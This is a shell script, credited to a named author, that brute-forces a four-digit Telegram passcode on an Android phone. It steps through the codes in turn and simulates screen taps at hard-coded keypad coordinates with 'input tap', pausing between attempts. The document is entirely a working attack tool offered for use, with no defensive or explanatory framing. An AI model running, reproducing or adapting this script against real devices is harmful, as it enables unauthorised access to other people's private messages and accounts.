# Author: Sepehr Keshavarz Haddad
# Tested and Developed on Nexus 6
# https://github.com/Sepehr-Haddad/Telegram-Passcode-BruteForcer/
# https://www.youtube.com/watch?v=XsXu7RBBKhc

for i in `seq -w 9999`; do
	char1="`echo $i | cut -c1`"
	char2="`echo $i | cut -c2`"
	char3="`echo $i | cut -c3`"
	char4="`echo $i | cut -c4`"
	if [ "$char1" -eq 0 ]
	then
		char1="710 2050"
        elif [ "$char1" -eq 1 ]
        then
                char1="320 1050"
	elif [ "$char1" -eq 2 ]
        then
                char1="710 1050"
	elif [ "$char1" -eq 3 ]
        then
                char1="1094 1050"
	elif [ "$char1" -eq 4 ]
        then
                char1="320 1400"
	elif [ "$char1" -eq 5 ]
        then
                char1="710 1400"
	elif [ "$char1" -eq 6 ]
        then
                char1="1094 1400"
	elif [ "$char1" -eq 7 ]
        then
                char1="320 1690"
	elif [ "$char1" -eq 8 ]
        then
                char1="710 1690"
	elif [ "$char1" -eq 9 ]
        then
                char1="1094 1690"
        fi

	if [ "$char2" -eq 0 ]
        then
                char2="710 2050"
        elif [ "$char2" -eq 1 ]
        then
                char2="320 1050"
        elif [ "$char2" -eq 2 ]
        then
                char2="710 1050"
        elif [ "$char2" -eq 3 ]
        then
                char2="1094 1050"
        elif [ "$char2" -eq 4 ]
        then
                char2="320 1400"
        elif [ "$char2" -eq 5 ]
        then
                char2="710 1400"
        elif [ "$char2" -eq 6 ]
        then
                char2="1094 1400"
        elif [ "$char2" -eq 7 ]
        then
                char2="320 1690"
        elif [ "$char2" -eq 8 ]
        then
                char2="710 1690"
        elif [ "$char2" -eq 9 ]
        then
                char2="1094 1690"
        fi

	if [ "$char3" -eq 0 ]
        then
                char3="710 2050"
        elif [ "$char3" -eq 1 ]
        then
                char3="320 1050"
        elif [ "$char3" -eq 2 ]
        then
                char3="710 1050"
        elif [ "$char3" -eq 3 ]
        then
                char3="1094 1050"
        elif [ "$char3" -eq 4 ]
        then
                char3="320 1400"
        elif [ "$char3" -eq 5 ]
        then
                char3="710 1400"
        elif [ "$char3" -eq 6 ]
        then
                char3="1094 1400"
        elif [ "$char3" -eq 7 ]
        then
                char3="320 1690"
        elif [ "$char3" -eq 8 ]
        then
                char3="710 1690"
        elif [ "$char3" -eq 9 ]
        then
                char3="1094 1690"
        fi

	if [ "$char4" -eq 0 ]
        then
                char4="710 2050"
        elif [ "$char4" -eq 1 ]
        then
                char4="320 1050"
        elif [ "$char4" -eq 2 ]
        then
                char4="710 1050"
        elif [ "$char4" -eq 3 ]
        then
                char4="1094 1050"
        elif [ "$char4" -eq 4 ]
        then
                char4="320 1400"
        elif [ "$char4" -eq 5 ]
        then
                char4="710 1400"
        elif [ "$char4" -eq 6 ]
        then
                char4="1094 1400"
        elif [ "$char4" -eq 7 ]
        then
                char4="320 1690"
        elif [ "$char4" -eq 8 ]
        then
                char4="710 1690"
        elif [ "$char4" -eq 9 ]
        then
                char4="1094 1690"
        fi

	echo "trying $i: $char1 $char2 $char3  $char4 "
	input tap $char1
	sleep 0.1
	input tap $char2
	sleep 0.1
	input tap $char3
	sleep 0.1
	input tap $char4
	sleep 0.5
done
